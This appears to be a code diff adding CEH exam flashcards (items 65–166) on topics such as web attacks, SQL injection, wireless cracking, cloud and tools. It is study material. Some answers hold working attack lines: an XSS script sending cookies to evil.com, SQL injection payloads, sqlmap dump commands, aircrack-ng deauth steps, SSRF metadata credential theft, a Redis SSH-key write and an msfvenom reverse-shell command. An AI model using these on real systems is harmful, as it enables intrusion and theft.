+  {id:65,cat:"Session Hijack",diff:"H",q:"Describe the full XSS session theft attack flow.",a:"1. Attacker injects: <script>document.location='http://evil.com/?c='+document.cookie</script> into a vulnerable page. 2. Victim loads page — script executes in their browser. 3. Session cookie sent to attacker's server. 4. Attacker uses cookie to impersonate victim."},
+  {id:66,cat:"IDS/Firewall",diff:"E",q:"What is the difference between an IDS and an IPS?",a:"IDS (Intrusion Detection System): passive — monitors and alerts only, no traffic blocking. IPS (Intrusion Prevention System): inline — actively blocks malicious traffic in real-time. IPS adds latency; IDS does not. Both use signature-based and anomaly-based detection."},
+  {id:67,cat:"IDS/Firewall",diff:"M",q:"What is the difference between NIDS and HIDS?",a:"NIDS monitors network traffic on a segment — detects network attacks but blind to encrypted traffic or host events. HIDS monitors logs, file integrity, and system calls on a specific host — detects rootkits, insider threats, and log tampering."},
+  {id:68,cat:"IDS/Firewall",diff:"M",q:"An attacker splits a payload across multiple tiny packets to evade IDS. What is this?",a:"Packet fragmentation attack — individual fragments look benign; IDS misses the attack if it doesn't reassemble and inspect the full stream. Countermeasure: fragment reassembly in the IDS/NGFW before inspection."},
+  {id:69,cat:"IDS/Firewall",diff:"M",q:"What is a stateful firewall vs a packet filter?",a:"Stateful tracks active connection state (TCP sessions) — allows return traffic automatically and blocks spoofed packets. Packet filter (stateless) evaluates each packet independently on header info alone — can be bypassed with crafted ACK/RST packets."},
+  {id:70,cat:"IDS/Firewall",diff:"E",q:"What is a DMZ and what does it protect?",a:"Demilitarised Zone — a network segment between the internet and internal LAN hosting public-facing servers (web, email, DNS). If a DMZ server is compromised, the attacker only reaches the DMZ, not the internal network. Implemented with two firewalls."},
+  {id:71,cat:"IDS/Firewall",diff:"M",q:"What is a honeypot and a honeynet?",a:"Honeypot: a decoy system designed to attract and study attackers — appears to contain valuable data but is isolated and monitored. Honeynet: a network of honeypots. Used for threat intelligence and attacker profiling. NOT for production use."},
+  {id:72,cat:"Web Servers",diff:"M",q:"What web server configuration file can be misconfigured to reveal information to attackers?",a:"httpd.conf (Apache), web.config (IIS), nginx.conf (Nginx). Misconfigured files can enable directory listing, reveal server version, expose debug settings, allow insecure HTTP methods (PUT, DELETE), and bypass authentication."},
+  {id:73,cat:"Web Servers",diff:"M",q:"What is a directory traversal attack? Give an example.",a:"Using ../ sequences to navigate outside the web root and access system files. Example: GET /../../../../etc/passwd HTTP/1.1. Countermeasure: input validation (reject ../ sequences), chroot jail, least-privilege file permissions."},
+  {id:74,cat:"Web Servers",diff:"M",q:"What tool specifically scans for web server misconfigurations and outdated software?",a:"Nikto — automated web server scanner checking for: outdated software, default/test files, insecure HTTP methods, verbose error messages, and known CVEs. Not stealthy — generates lots of traffic. Alternative: OWASP ZAP."},
+  {id:75,cat:"Web Servers",diff:"H",q:"What is web cache poisoning?",a:"Attacker manipulates a cached web response by injecting malicious content that gets stored in proxy/CDN cache. Subsequent users receive the poisoned response. Requires: cacheable request + ability to inject unkeyed input (e.g., HTTP headers) into the response."},
+  {id:76,cat:"Web Apps",diff:"E",q:"What is OWASP A01:2021 Broken Access Control?",a:"Users can act outside intended permissions. Includes: IDOR (change ID parameter to access others' data), missing function-level access control, force browsing to admin pages, privilege escalation. #1 in OWASP Top 10 since 2021."},
+  {id:77,cat:"Web Apps",diff:"M",q:"What is the difference between Stored XSS and Reflected XSS?",a:"Stored (Persistent): payload saved in DB, executes for every user viewing the page — higher impact. Reflected: payload in URL/parameter, server immediately reflects it — requires victim to click a crafted link. Both steal cookies or perform actions as the victim."},
+  {id:78,cat:"Web Apps",diff:"M",q:"How does a CSRF attack work and what is its primary defence?",a:"CSRF forges HTTP requests from an authenticated user's browser without their knowledge (e.g., hidden form auto-submitting a bank transfer). Primary defence: CSRF tokens (unique per-session value validated server-side). Also: SameSite=Strict cookie attribute."},
+  {id:79,cat:"Web Apps",diff:"M",q:"What is the difference between LFI and RFI, and which is more severe?",a:"LFI (Local File Inclusion): includes local server files — reads /etc/passwd, config files, log poisoning. RFI (Remote File Inclusion): includes a remote file from attacker URL → direct remote code execution. RFI is more severe."},
+  {id:80,cat:"Web Apps",diff:"H",q:"What is SSRF and what cloud-specific endpoint does it target?",a:"SSRF (Server-Side Request Forgery) tricks a server into making HTTP requests the attacker controls. Cloud target: AWS/GCP/Azure metadata endpoint (169.254.169.254) — returns IAM credentials, access tokens, and instance config → full cloud account compromise."},
+  {id:81,cat:"Web Apps",diff:"H",q:"What is an XML External Entity (XXE) injection attack?",a:"Attacker injects malicious XML with external entity reference: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>. Parser resolves it, returning file contents. Can also perform SSRF and DoS (billion laughs). Fix: disable external entity processing in XML parser config."},
+  {id:82,cat:"Web Apps",diff:"M",q:"What is clickjacking and what HTTP header prevents it?",a:"Embedding a target page in an invisible iframe to trick users into clicking on it (liking, paying, changing settings). Prevention: X-Frame-Options: DENY or SAMEORIGIN. Modern: Content-Security-Policy: frame-ancestors 'none'."},
+  {id:83,cat:"SQLi",diff:"E",q:"What SQL payload bypasses a login form?",a:"' OR '1'='1' -- \nMakes the WHERE clause always TRUE. The -- comments out the rest of the query. Variations: ' OR 1=1 -- | admin'-- | ' OR 'x'='x. Single-quote syntax varies by DB."},
+  {id:84,cat:"SQLi",diff:"M",q:"How does Union-based SQL injection work?",a:"Appends UNION SELECT to original query to retrieve data from other tables. Example: ' UNION SELECT username,password FROM users --\nRequirement: column count and data types must match original query. Use NULL to find column count: ' UNION SELECT NULL,NULL--"},
+  {id:85,cat:"SQLi",diff:"H",q:"How does time-based blind SQL injection confirm vulnerability?",a:"Injects conditional time-delay: ' AND IF(1=1,SLEEP(5),0)-- (MySQL). If response delays 5 seconds, condition is TRUE and SQLi is confirmed. Data extracted one bit at a time by observing timing. MSSQL: WAITFOR DELAY '0:0:5'. Oracle: dbms_pipe.receive_message(('x'),5)."},
+  {id:86,cat:"SQLi",diff:"M",q:"What SQLmap flags enumerate databases, then tables, then dump data?",a:"1. sqlmap -u 'http://target/?id=1' --dbs (list databases)\n2. -D dbname --tables (list tables)\n3. -D dbname -T tablename --columns\n4. -D dbname -T tablename --dump (extract data)"},
+  {id:87,cat:"SQLi",diff:"E",q:"What is the MOST effective defence against SQL injection?",a:"Parameterised queries / prepared statements — separates SQL code from user data at the driver level. Input is treated as data, never as code. Java: PreparedStatement; Python: cursor.execute(q,(param,)). WAFs and input validation are additional layers only."},
+  {id:88,cat:"SQLi",diff:"H",q:"What is second-order SQL injection?",a:"Data is safely stored (escaped on input) but later retrieved and used in a SQL query without re-sanitisation. Example: username 'admin'-- is stored safely, but a later UPDATE query uses it unsanitised: UPDATE users SET pw='x' WHERE name='admin'--"},
+  {id:89,cat:"Wireless",diff:"E",q:"This protocol uses GCMP-256, HMAC-SHA384, and ECDSA with a 384-bit elliptic curve. What is it?",a:"WPA3-Enterprise (192-bit security mode) — designed for sensitive environments (government, finance). WPA3-Personal uses 128-bit GCMP. WPA2-Enterprise uses AES/CCMP-128. Key difference: WPA3 uses SAE instead of PSK."},
+  {id:90,cat:"Wireless",diff:"E",q:"Why is WEP completely broken?",a:"WEP uses RC4 with 24-bit IVs (Initialization Vectors) that repeat too frequently in busy networks. Statistical analysis of ~50,000–85,000 captured packets reveals the key in minutes. Tool: Aircrack-ng. Never use WEP — it provides no real security."},
+  {id:91,cat:"Wireless",diff:"M",q:"What is the Aircrack-ng WPA cracking workflow?",a:"1. airmon-ng start wlan0 (enable monitor mode)\n2. airodump-ng wlan0mon -c [ch] --bssid [AP] -w cap (capture)\n3. aireplay-ng -0 5 -a [AP MAC] -c [client MAC] wlan0mon (deauth to force handshake)\n4. aircrack-ng -w wordlist.txt cap.cap (crack offline)"},
+  {id:92,cat:"Wireless",diff:"M",q:"What is a WPS PIN attack and why does it only need ~11,000 attempts?",a:"WPS PIN is 8 digits split into two 4-digit halves (last digit is checksum). Each half is verified independently — reducing to 10^4 + 10^3 = 11,000 combinations. Tool: Reaver. Allows recovery of WPA passphrase regardless of complexity."},
+  {id:93,cat:"Wireless",diff:"H",q:"What does WPA3's SAE protect against that WPA2 does not?",a:"Offline dictionary attacks — even with a captured WPA2 4-way handshake, attackers can crack it offline at billions of guesses/sec. WPA3-SAE (Dragonfly) requires active interaction with the AP for each guess — practical offline cracking is eliminated."},
+  {id:94,cat:"Wireless",diff:"H",q:"What is a PMKID attack and why doesn't it need a client?",a:"Targets the RSN IE in a single beacon/probe response frame — no 4-way handshake capture needed (no client required). PMKID = HMAC-SHA1(PMK, 'PMK Name', AP MAC, Client MAC). Attacker requests one frame from AP, then cracks PMKID offline. Faster setup than handshake capture."},
+  {id:95,cat:"Wireless",diff:"M",q:"What is an Evil Twin attack vs a rogue access point?",a:"Evil Twin: deliberately clones an existing AP's SSID (and sometimes BSSID) with stronger signal to lure clients away → MITM position. Rogue AP: any unauthorised AP on a network (may not mimic a legitimate one). Evil Twin is targeted; rogue AP is broader."},
+  {id:96,cat:"Mobile",diff:"E",q:"What is the security difference between jailbreaking iOS and rooting Android?",a:"Both remove manufacturer restrictions and grant superuser access, dramatically increasing attack surface: unsigned app execution, filesystem access, sandbox bypass, disabled security features. Jailbreaking disables Apple's code signing; rooting bypasses Android permission model."},
+  {id:97,cat:"Mobile",diff:"M",q:"What is certificate pinning and how do pentesters bypass it?",a:"App accepts only a specific hardcoded certificate → blocks Burp Suite MITM. Bypass: Frida (dynamic instrumentation), objection (Frida-based tool), SSL Kill Switch (iOS jailbreak tweak), repackaged APK with patched pinning code (Android)."},
+  {id:98,cat:"Mobile",diff:"M",q:"What does Drozer do in Android security testing?",a:"Enumerates Android app attack surface: exported activities, content providers, broadcast receivers, and services. Can invoke exported components, query content providers, and send intents without user interaction — without needing root."},
+  {id:99,cat:"Mobile",diff:"H",q:"What are OWASP Mobile Top 10 M1 and M2?",a:"M1: Improper Platform Usage — misuse of platform features, permission over-granting, insecure data exposure through platform APIs. M2: Insecure Data Storage — sensitive data stored unencrypted in SQLite, SharedPreferences, log files, external storage, or temp files."},
+  {id:100,cat:"IoT / OT",diff:"E",q:"Which search engine finds internet-exposed IoT and SCADA devices?",a:"Shodan — indexes internet-connected devices by banners/responses. Finds cameras, routers, PLCs, printers, and industrial control systems. Shodan query examples: port:23 default password (Telnet with default creds), product:webcam, org:'Target Company'."},
+  {id:101,cat:"IoT / OT",diff:"M",q:"What tool extracts and analyses IoT firmware?",a:"binwalk — extracts compressed filesystems from firmware images, identifies file types and architecture. After extraction: firmwalker searches for passwords, API keys, and hardcoded credentials. Ghidra/radare2 for binary reverse engineering."},
+  {id:102,cat:"IoT / OT",diff:"H",q:"How does IT security differ from OT/ICS security priorities?",a:"IT: CIA triad — Confidentiality is primary. OT/ICS/SCADA: Availability is paramount (downtime = physical harm, production loss, safety risk). Integrity second. Confidentiality third. Patching OT is difficult — systems run 24/7 and patches risk dangerous outages."},
+  {id:103,cat:"IoT / OT",diff:"M",q:"What IoT protocol commonly runs without authentication on port 1883?",a:"MQTT (Message Queuing Telemetry Transport) — lightweight pub/sub protocol for IoT. Default: no authentication, no TLS, no access control. Port 1883 (cleartext), 8883 (TLS). Exposed brokers allow anyone to subscribe to all topics and inject commands."},
+  {id:104,cat:"Cloud",diff:"M",q:"In IaaS, who patches the OS under the Shared Responsibility Model?",a:"The customer — in IaaS, the CSP manages physical hardware, network, and hypervisor only. Customer manages: OS, runtime, middleware, application, and data. In PaaS: CSP also manages OS and runtime. In SaaS: CSP manages almost everything."},
+  {id:105,cat:"Cloud",diff:"H",q:"How does a cloud metadata SSRF attack work step by step?",a:"1. Find SSRF vulnerability in URL parameter. 2. Inject: http://169.254.169.254/latest/meta-data/iam/security-credentials/ 3. Response returns IAM role name. 4. Fetch /latest/meta-data/iam/security-credentials/[role-name]. 5. Receive temporary AWS keys. 6. Use keys with AWS CLI to access all authorised resources."},
+  {id:106,cat:"Cloud",diff:"M",q:"What is a misconfigured S3 bucket and what does public access enable?",a:"S3 bucket set to public ACL allows any unauthenticated internet user to LIST (see all filenames) and GET (download files). Has caused major breaches (Capital One 100M records, Twitch source code). Fix: Enable S3 Block Public Access setting at account level."},
+  {id:107,cat:"Cloud",diff:"H",q:"What is an IAM privilege escalation attack in AWS?",a:"Attacker with limited permissions uses IAM misconfigurations to gain higher privileges: create policy + attach to self (iam:CreatePolicy + iam:AttachUserPolicy), assume a privileged role (sts:AssumeRole), or modify an existing policy. Tool: Pacu's privesc module."},
+  {id:108,cat:"Cloud",diff:"H",q:"What is a container escape attack and what common misconfiguration enables it?",a:"Breaking out from a container to the underlying host OS. Common vectors: privileged containers (--privileged gives full host kernel access), mounted Docker socket (/var/run/docker.sock → create privileged containers from inside container → host access)."},
+  {id:109,cat:"Cryptography",diff:"E",q:"The 3DES algorithm uses how many keys and what is its block size?",a:"3 keys, each 56 bits (168 bits total, 112-bit effective security due to meet-in-the-middle attack). Block size: 64 bits. Process: Encrypt(K1) → Decrypt(K2) → Encrypt(K3). Being deprecated — use AES instead."},
+  {id:110,cat:"Cryptography",diff:"M",q:"Which encryption algorithm provides the best balance of security and performance for bulk data?",a:"AES-256 — current gold standard for symmetric encryption. Hardware acceleration (AES-NI instruction set) makes it extremely fast. 256-bit key provides 128-bit post-quantum security (Grover's algorithm halves effective key length). Far faster than 3DES."},
+  {id:111,cat:"Cryptography",diff:"M",q:"What is the difference between a digital signature and a digital certificate?",a:"Digital signature: created with sender's PRIVATE key to prove authenticity and integrity of a message/document. Digital certificate: issued by a CA, binds a PUBLIC key to an identity (X.509). Certificate contains: public key + identity + CA's digital signature."},
+  {id:112,cat:"Cryptography",diff:"H",q:"A CEH needs key exchange over a public channel without transmitting the secret. Which algorithm?",a:"Diffie-Hellman (DH) or ECDH — allows two parties to establish a shared secret over a public channel using mathematical operations that cannot be reversed by an eavesdropper. The secret is never transmitted. Used in TLS, SSH, IPsec."},
+  {id:113,cat:"Cryptography",diff:"M",q:"What is a birthday attack in cryptography?",a:"Exploits the birthday paradox: only √N hashes needed before ~50% collision probability. Used to find two inputs with the same hash. MD5 (128-bit) has 2^64 collision resistance — computationally feasible. SHA-256 has 2^128 — not feasible currently."},
+  {id:114,cat:"Cryptography",diff:"E",q:"What is the difference between encryption and hashing?",a:"Encryption: two-way, reversible with correct key. Used for confidentiality. Hashing: one-way, produces fixed-size digest, cannot be reversed. Used for integrity verification and password storage. Never use encryption to 'store' passwords — use hashing with salt."},
+  {id:115,cat:"Cryptography",diff:"M",q:"Why is bcrypt superior to MD5 for storing passwords?",a:"bcrypt: adaptive (cost factor scales with hardware), slow-by-design (hundreds of milliseconds vs nanoseconds for MD5), automatically salted (unique hash per password), no hardware acceleration. MD5: instantaneous, no salt by default, GPU-crackable at billions/second."},
+  {id:116,cat:"Pentest",diff:"M",q:"A CEH recommends a security strategy after a breach from an unidentified vulnerability. What is BEST?",a:"Defence-in-Depth — multiple overlapping security layers (perimeter, network, host, application, data). If one layer fails, others remain. Accounts for unknown vulnerabilities by limiting blast radius. Combines technical, administrative, and physical controls."},
+  {id:117,cat:"Pentest",diff:"E",q:"What document must be signed BEFORE any penetration test begins?",a:"Rules of Engagement (RoE) — defines: scope (in/out-of-scope targets), testing window, permitted techniques, escalation procedures, emergency contacts, and legal authorisation. Without signed RoE, testing is potentially illegal under CFAA and equivalent laws."},
+  {id:118,cat:"Pentest",diff:"M",q:"What is the difference between grey-box and white-box penetration testing?",a:"Grey-box: partial knowledge — some credentials, network diagrams, IP ranges. Simulates insider threat or post-phishing scenario. White-box (crystal box): full knowledge — source code, all credentials, complete architecture. Most thorough; used for code review + pentest."},
+  {id:119,cat:"Pentest",diff:"H",q:"What is BloodHound used for?",a:"Active Directory attack path analysis — visualises relationships between users, groups, computers, and GPOs to identify paths to Domain Admin using graph theory. Collectors: SharpHound (Windows), BloodHound.py (Linux). Essential for AD privilege escalation planning."},
+  {id:120,cat:"Pentest",diff:"H",q:"What is pivoting and how is it achieved with Metasploit?",a:"Using a compromised host as a relay to attack internal networks not directly reachable. Metasploit: run 'route add [subnet] [session_id]' to route traffic through Meterpreter session. Also: portfwd for specific ports, SOCKS proxy (auxiliary/server/socks4a) for proxychains."},
+  {id:121,cat:"Ports",diff:"E",q:"What is the difference between port 20 and port 21 in FTP?",a:"Port 21: FTP Control channel — commands and authentication. Port 20: FTP Data channel (Active mode file transfer). Passive FTP uses a negotiated high port for data instead of port 20 (firewall-friendly)."},
+  {id:122,cat:"Ports",diff:"E",q:"Port 110 — what service and what is its encrypted alternative?",a:"POP3 (Post Office Protocol v3) — retrieves email from server, cleartext. Downloads and often deletes from server. Encrypted: POP3S on port 995 (TLS). Alternative: IMAP (port 143) for server-side email management."},
+  {id:123,cat:"Ports",diff:"E",q:"Port 143 — what service and what is its encrypted alternative?",a:"IMAP (Internet Message Access Protocol) — manages email on server (multiple devices, folders), cleartext. Encrypted: IMAPS on port 993. IMAP retains email on server; POP3 typically downloads and removes."},
+  {id:124,cat:"Ports",diff:"M",q:"Port 161/162 — what service and what is the difference?",a:"SNMP — 161/UDP for polling/queries (manager → agent). 162/UDP for SNMP Traps (agent → manager, unsolicited alerts). SNMPv1/v2 transmit community strings in cleartext. Use SNMPv3 for authentication and encryption."},
+  {id:125,cat:"Ports",diff:"M",q:"Ports 389 vs 636 — what service and why the difference?",a:"LDAP on 389 (cleartext directory queries — Active Directory). LDAPS on 636 (LDAP over SSL/TLS — encrypted). LDAP allows attackers to enumerate AD objects if accessible. Always use LDAPS in production."},
+  {id:126,cat:"Ports",diff:"M",q:"Port 2375 — what service and why is it critical?",a:"Docker API (unencrypted) — exposed Docker daemon API. If accessible, attacker can: create privileged containers, mount host filesystem, spawn shells as root on host → full host compromise. NEVER expose. Port 2376 is TLS-authenticated Docker API."},
+  {id:127,cat:"Ports",diff:"M",q:"Port 6379 — what service and common misconfiguration?",a:"Redis — in-memory data store. Default install has NO authentication (requirepass not set). Exposed Redis = read/write all data, execute OS commands via config rewrite (CONFIG SET dir + CONFIG SET dbfilename + SAVE → write SSH key or cron job to disk)."},
+  {id:128,cat:"Ports",diff:"M",q:"Port 5900 — what service?",a:"VNC (Virtual Network Computing) — remote desktop access. Often uses weak/no authentication. Version 3.3 has hardcoded authentication bypass. Should be tunnelled over SSH. Default password is often blank or 'password'."},
+  {id:129,cat:"Ports",diff:"E",q:"Port 25 vs 587 vs 465 — what is each used for in email?",a:"25: SMTP (server-to-server email relay — often blocked on consumer ISPs). 587: SMTP Submission (client-to-server with STARTTLS — modern standard). 465: SMTPS (SMTP over SSL — legacy but still used). Use 587 for email clients."},
+  {id:130,cat:"Ports",diff:"M",q:"Port 8080 vs 8443 — what are these?",a:"8080: HTTP Alternate — common for dev servers, proxies, admin panels, Tomcat, Jenkins (unencrypted). 8443: HTTPS Alternate — HTTPS on non-standard port, common for Tomcat/JBoss admin, VPN portals. Both often have weaker security than 80/443."},
+  {id:131,cat:"Tools",diff:"M",q:"What is the difference between Metasploit's exploit, payload, auxiliary, and post modules?",a:"Exploit: code that exploits a vulnerability. Payload: code that executes on target after exploitation (shell, Meterpreter). Auxiliary: scanners, fuzzers, DoS modules (no payload needed). Post: post-exploitation actions — pivoting, persistence, credential dumping."},
+  {id:132,cat:"Tools",diff:"M",q:"What is Meterpreter and why is it preferred over a standard shell?",a:"Advanced in-memory payload: no disk footprint, encrypted communication, and rich features: filesystem, process injection, webcam/keylogger, token impersonation, pivoting. Commands: hashdump, getsystem, migrate, portfwd, run post/modules."},
+  {id:133,cat:"Tools",diff:"H",q:"What is the difference between a bind shell and a reverse shell?",a:"Bind shell: payload listens on target — attacker connects inbound. Blocked by ingress firewall. Reverse shell: target connects OUT to attacker — bypasses most firewalls (outbound traffic usually permitted). Reverse shells are far more common in real attacks."},
+  {id:134,cat:"Tools",diff:"M",q:"What does Mimikatz do and what does it attack?",a:"Extracts plaintext passwords, NTLM hashes, Kerberos tickets from Windows LSASS process memory. Enables: Pass-the-Hash, Pass-the-Ticket, Golden/Silver Ticket attacks. Requires SYSTEM or SeDebugPrivilege. Countermeasure: Credential Guard, Protected Users group."},
+  {id:135,cat:"Tools",diff:"H",q:"What does msfvenom do and what is an example command?",a:"Generates standalone malicious payloads in many formats (exe, elf, apk, ps1, php) with encoding to evade AV. Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe\nCombines payload generation + encoding."},
+  {id:136,cat:"Compliance",diff:"M",q:"What does PCI-DSS regulate and how many requirements does it have?",a:"Payment Card Industry Data Security Standard — governs organisations processing credit card data. 12 requirements covering: network security, cardholder data protection, vulnerability management, access control, monitoring, and security policy. Non-compliance = fines + loss of card processing rights."},
+  {id:137,cat:"Compliance",diff:"M",q:"What is the legal authorisation required for penetration testing?",a:"Written authorisation (signed contract, Rules of Engagement, Statement of Work, NDA). The Computer Fraud and Abuse Act (CFAA, US) criminalises unauthorised computer access. Written permission is the ONLY legal protection — verbal agreements are insufficient."},
+  {id:138,cat:"Compliance",diff:"M",q:"What does GDPR require regarding data breaches and what are the penalties?",a:"Notify supervisory authority within 72 hours of discovering a breach. Notify affected individuals if high risk to their rights. Penalties: up to €20 million or 4% of global annual turnover — whichever is higher. Applies to EU residents' data globally."},
+  {id:139,cat:"Compliance",diff:"M",q:"What is the difference between a security policy, standard, procedure, and guideline?",a:"Policy: high-level management directive (what must be done — mandatory). Standard: specific measurable requirements (how much/what kind — mandatory). Procedure: step-by-step implementation (how — mandatory). Guideline: recommended best practice (not mandatory). Policy → Standard → Procedure."},
+  {id:140,cat:"Scenario",diff:"H",q:"A CEH probing via zombie sees IPID increment by 1. What does this mean?",a:"The target port is CLOSED. Closed port → target sends RST directly to zombie (not SYN-ACK) → zombie IPID only increments once (for the attacker's probe). IPID+2 = open (zombie received SYN-ACK from target, sent RST, two increments). IPID+1 = closed."},
+  {id:141,cat:"Scenario",diff:"M",q:"A CEH captures a WPA2 handshake but can't crack the password. What is the next step?",a:"Use more comprehensive wordlist/rules (Hashcat -r OneRuleToRuleThemAll). Also: try PMKID attack (no client needed), Evil Twin (capture credentials directly), or WPS PIN attack with Reaver (if WPS enabled). Consider: custom wordlist based on target OSINT."},
+  {id:142,cat:"Scenario",diff:"M",q:"An IDS generates thousands of alerts daily but most are for legitimate traffic. What is this?",a:"High false positive rate — anomaly-based IDS not properly tuned to the environment's baseline. Causes alert fatigue: analysts ignore alerts → real attacks go undetected. Fix: tune baseline, use SIEM correlation rules, whitelist known-good behaviour."},
+  {id:143,cat:"Scenario",diff:"H",q:"Web server logs show: GET /../../../../etc/passwd returning HTTP 200. What happened?",a:"Successful directory traversal attack — web server failed to restrict access to web root. The ../ sequences navigated up to root directory, /etc/passwd was returned. Fix: input validation (reject ../), chroot jail confining server to webroot, least-privilege file permissions."},
+  {id:144,cat:"Scenario",diff:"M",q:"Traffic capture shows: USER admin, PASS secret123 in cleartext. Which protocol?",a:"FTP (port 21) — transmits credentials in cleartext. Confirmed by port number in packet capture. Also possible: Telnet (23), HTTP Basic Auth (80), POP3 (110), IMAP (143). Countermeasure: SFTP (port 22, encrypted), FTPS (990/21 with TLS)."},
+  {id:145,cat:"Scenario",diff:"H",q:"DB logs show: SELECT * FROM users WHERE id=1 AND SLEEP(5)-- . What is the attacker doing?",a:"Time-based blind SQL injection — confirming vulnerability existence and/or extracting data byte by byte using conditional delays. SLEEP(5) confirms injectable parameter. Attacker is likely using SQLmap or writing custom extraction script."},
+  {id:146,cat:"Scenario",diff:"M",q:"A web server response includes: Server: Apache/2.4.49. What is the immediate concern?",a:"Apache 2.4.49 contains CVE-2021-41773 (path traversal + RCE). Exposing version enables targeted CVE exploitation. Fix: patch immediately, remove Server header (ServerTokens Prod in httpd.conf), and remove X-Powered-By headers."},
+  {id:147,cat:"Scenario",diff:"M",q:"An employee receives a USB drive labelled 'Salary Survey Q4 Results' and plugs it in. What attack?",a:"Baiting — using physical media with enticing labels to deliver malware. The USB likely exploits AutoRun, USB HID emulation (Rubber Ducky), or drops malware files. Defence: disable AutoRun, USB port control policy, security awareness training."},
+  {id:148,cat:"Scenario",diff:"H",q:"A web app returns 'Invalid username' for wrong username but 'Invalid password' for correct username. What vulnerability?",a:"Username enumeration — different error messages reveal which part of credentials is wrong. Attackers build valid username lists for targeted brute force or credential stuffing. Fix: generic message for all login failures: 'Invalid username or password'."},
+  {id:149,cat:"Scenario",diff:"H",q:"All 65535 Nmap ports return 'filtered'. What does this indicate?",a:"A stateful firewall silently dropping all packets (DROP policy vs REJECT). 'Filtered' = no response received — firewall discards packets without sending RST or ICMP. Next step: try ACK scan (-sA) to map firewall rules, or scan from different source IP."},
+  {id:150,cat:"Scenario",diff:"M",q:"A user receives an email asking them to call an IT number to 'verify their credentials'. What attack type?",a:"Vishing setup (voice phishing) — email is the lure, actual credential theft happens over phone. A hybrid social engineering attack: email establishes pretence of legitimacy, phone call extracts credentials. Also called 'callback phishing'."},
+  {id:151,cat:"Foundations",diff:"M",q:"What is the difference between black-hat, white-hat, and grey-hat hackers?",a:"Black-hat: malicious intent, no authorisation — criminal. White-hat (ethical hacker): authorised testing, improves security, follows code of ethics. Grey-hat: hacks without authorisation but without malicious intent — may disclose vulnerabilities, still illegal in most jurisdictions."},
+  {id:152,cat:"Foundations",diff:"E",q:"What is a zero-day vulnerability?",a:"A vulnerability unknown to the software vendor with no available patch. 'Zero days' because the vendor has had zero days to fix it. Extremely valuable. Once patched, it becomes an N-day vulnerability. Active zero-days command high prices in exploit markets."},
+  {id:153,cat:"System Hacking",diff:"M",q:"What is the Windows SAM database and how do attackers access it?",a:"Security Account Manager — stores NTLM hashes of Windows user credentials. Located at C:\\Windows\\System32\\config\\SAM. Locked during runtime. Access methods: offline (boot from live OS), Volume Shadow Copy (vssadmin), or Mimikatz to dump from LSASS memory at runtime."},
+  {id:154,cat:"Malware",diff:"M",q:"What is the difference between a logic bomb and a time bomb?",a:"Logic bomb: malicious code triggers on a specific condition (user deletion, file absence, login count). Time bomb: triggers at a specific date/time. Both are planted by insiders or malware. Logic bombs are harder to detect because they lie dormant until triggered."},
+  {id:155,cat:"Web Apps",diff:"M",q:"What is the difference between authentication and authorisation?",a:"Authentication: verifying IDENTITY — 'who are you?' (password, MFA, certificate). Authorisation: verifying PERMISSIONS — 'what are you allowed to do?' (RBAC, ACLs). CEH tests: Broken Authentication (OWASP A07) and Broken Access Control (OWASP A01) as separate vulnerabilities."},
+  {id:156,cat:"Tools",diff:"M",q:"What does Gobuster do and give an example command?",a:"Directory/file and DNS brute-forcing. Example: gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak\nAlso: gobuster dns -d target.com -w subdomains.txt for subdomain enumeration."},
+  {id:157,cat:"Cryptography",diff:"M",q:"What is PKI and what are its main components?",a:"Public Key Infrastructure — framework for managing digital certificates. Components: CA (Certificate Authority — issues/signs certs), RA (Registration Authority — verifies identity before issuance), CRL (Certificate Revocation List), OCSP (real-time revocation checking), Repository (cert storage)."},
+  {id:158,cat:"Pentest",diff:"M",q:"What is lateral movement and name three techniques?",a:"Moving from one compromised host to attack other systems on the same network. Techniques: 1) Pass-the-Hash (NTLM), 2) Pass-the-Ticket (Kerberos), 3) RDP with stolen credentials, 4) PsExec/WMI, 5) SSH key forwarding, 6) BloodHound-identified AD attack paths."},
+  {id:159,cat:"Compliance",diff:"H",q:"What is the Computer Fraud and Abuse Act (CFAA) and why does it matter for ethical hackers?",a:"US federal law criminalising unauthorised computer access. Key to CEH: any access without explicit written permission is a federal crime regardless of intent. Ethical hackers MUST have signed authorisation before testing. Exceeding scope (authorised access) also violates CFAA."},
+  {id:160,cat:"Scanning",diff:"H",q:"What is OS fingerprinting and what two approaches exist?",a:"Identifying a target's OS by analysing network behaviour. Active: send crafted packets, analyse TCP ISN, window size, TTL, DF bit, TCP options (Nmap -O). Passive: analyse existing traffic without sending packets — p0f tool. Passive is stealthier but requires observable traffic."},
+  {id:161,cat:"Enumeration",diff:"H",q:"What information can be extracted from SNMP with community string 'public'?",a:"ARP table, routing table, network interfaces and IPs, running processes, open TCP/UDP ports, installed software, system description (OS, hostname, uptime), and often full device configuration including passwords on misconfigured devices."},
+  {id:162,cat:"Sniffing",diff:"M",q:"What is a replay attack and how does sniffing enable it?",a:"Attacker captures valid authentication tokens/session cookies/Kerberos tickets via sniffing, then retransmits them later to gain unauthorised access. Defence: timestamps in tokens, nonces (one-time values), sequence numbers, short token lifetimes."},
+  {id:163,cat:"DoS / DDoS",diff:"H",q:"What is a DRDoS (Distributed Reflected DoS) attack?",a:"Uses innocent third-party servers (DNS resolvers, NTP servers) as amplifiers. Attacker spoofs victim's IP, sends small queries → large responses directed at victim. Reflects through innocents, making attribution difficult. DNS amplification = 70× amplification factor."},
+  {id:164,cat:"Mobile",diff:"H",q:"What is an Android intent attack?",a:"Android Intents are messages between app components. Exported components without permission checks can be invoked by any app. Attack: malicious app sends crafted intent to exported activity to steal data, trigger privileged actions, or bypass authentication."},
+  {id:165,cat:"IoT / OT",diff:"H",q:"What is a Modbus attack in OT/SCADA?",a:"Modbus is an industrial serial protocol with NO authentication, NO encryption, NO integrity checking. Any attacker on the network can: read any register (sensor data), write to output coils (physically control valves/pumps/motors), and replay commands. Attack tool: ModbusPal."},
+  {id:166,cat:"Scenario",diff:"H",q:"A web app uses string concatenation for all SQL queries. What is the BEST single fix?",a:"Replace ALL SQL string concatenation with parameterised queries (prepared statements). The query structure is predefined with placeholders; values bound separately — database driver ensures values are treated as data, never code. Cannot be bypassed by any SQL injection technique."},
